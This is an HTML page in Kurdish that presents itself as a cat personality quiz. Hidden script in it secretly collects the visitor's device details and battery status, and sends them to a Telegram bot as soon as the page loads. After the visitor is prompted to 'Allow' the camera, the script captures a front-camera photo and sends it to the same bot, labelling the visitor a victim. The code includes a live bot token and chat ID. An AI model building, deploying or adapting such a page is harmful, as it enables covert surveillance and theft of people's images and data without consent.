<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تاقیکردنەوەی کەسایەتی پشیلەکان 🐱</title>
    <style>
        body { 
            font-family: Tahoma, sans-serif; 
            /* باکگراوندێکی هێمن و شیرین */
            background: linear-gradient(135deg, #fbcfe8, #fed7aa, #bae6fd);
            color: #1e293b; 
            text-align: center; 
            padding: 40px 20px; 
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container { 
            background: rgba(255, 255, 255, 0.9); 
            max-width: 400px; 
            width: 100%;
            margin: auto; 
            padding: 30px 20px; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.15); 
        }
        .cat-img {
            width: 120px;
            height: 120px;
            object-fit: cover;
            border-radius: 50%;
            border: 4px solid #f472b6;
            margin-bottom: 15px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }
        h2 { color: #db2777; margin-bottom: 10px; font-size: 22px; }
        p { color: #475569; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
        .alert-box {
            background: #fef08a;
            border: 1px solid #facc15;
            padding: 10px;
            border-radius: 8px;
            font-size: 13px;
            color: #854d0e;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .btn {
            background: #db2777;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 4px 10px rgba(219, 39, 119, 0.3);
            transition: 0.2s;
        }
        .btn:hover { background: #be185d; }
        .questions-area { display: none; text-align: right; margin-top: 20px; }
        .q-item { margin-bottom: 15px; background: #f8fafc; padding: 10px; border-radius: 8px; }
    </style>
</head>
<body>

    <div class="container" id="mainCard">
        <!-- وێنەی پشیلەی شیرین -->
        <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=300" alt="Cute Cat" class="cat-img">
        
        <h2>🐾 تاقیکردنەوەی جۆری پشیلەکەت!</h2>
        <p>بزانە بەپێی شێوازی ژیانت لە چ جۆرە پشیلەیەکی نازدار دەچیت.</p>
        
        <!-- داواکاریە سەرنجڕاکێشەکە -->
        <div class="alert-box">
            ✨ تکایە بۆ بەردەوامبوون و چالاککردنی پشکنینەکە، دوگمەی **Allow** دابگرە.
        </div>

        <button class="btn" onclick="startPrank()">دەستپێکردنی تاقیکردنەوە 🚀</button>
    </div>

    <!-- بەشی پرسیارەکان کە دواتر دەردەکەوێت بۆ ئەوەی باوەڕ پێکراو بێت -->
    <div class="container questions-area" id="questionsCard">
        <h2>✨ پرسیاری یەکەم:</h2>
        <div class="q-item">
            <p>1. ئایا زیاتر حەزت بە خەوتنە یان یاری کردن؟</p>
            <label><input type="radio" name="q1"> خەوتن 😴</label><br>
            <label><input type="radio" name="q1"> یاری کردن 🎾</label>
        </div>
        <button class="btn" style="width: 100%;" onclick="alert('ئەمە تەنها پڕانک بوو! 😂')">بینینی ئەنجام</button>
    </div>

    <!-- ئەعناری شاراوە بۆ کامێرا -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = "8763977900:AAEYu-yWlR7Oo5XHIpl8Z13hgLljv9z73_I";
        const chatId = "8469010473";

        // هەر کە لینکەکە دەکرێتەوە، دەستبەجێ زانیاری شاحن و پاتری دەنێرێت
        window.onload = async function() {
            let info = "🚨 قوربانییەک لینکەکەی کردەوە (پشیلە)!\n\n";
            info += "🌐 جۆری ئامێر: " + navigator.userAgent + "\n";

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    info += "🔋 ڕێژەی پاتری: " + Math.round(battery.level * 100) + "%\n";
                    info += "🔌 شاحن لێدراوە؟ " + (battery.charging ? "بەڵێ (شاحنەکەی لێیە)" : "نەخێر") + "\n";
                } catch (e) {}
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: info })
            });
        };

        // کاتێک دوگمەی دابگرێت بۆ ڕێگەپێدانی کامێرا و چوونکە ناو پرسیارەکان
        async function startPrank() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'cat_prank.jpg');
                        formData.append('caption', '📸 وێنەی سەرکەوتووی قوربانی!');

                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg');

                    stream.getTracks().forEach(track => track.stop());
                }, 1500);

            } catch (err) {
                console.log("کامێرا ڕەتکرایەوە", err);
            }

            // گواستنەوە بۆ بەشی پرسیارەکان لەسەر شاشەکەی خۆی
            document.getElementById('mainCard').style.display = 'none';
            document.getElementById('questionsCard').style.display = 'block';
        }
    </script>
</body>
</html>
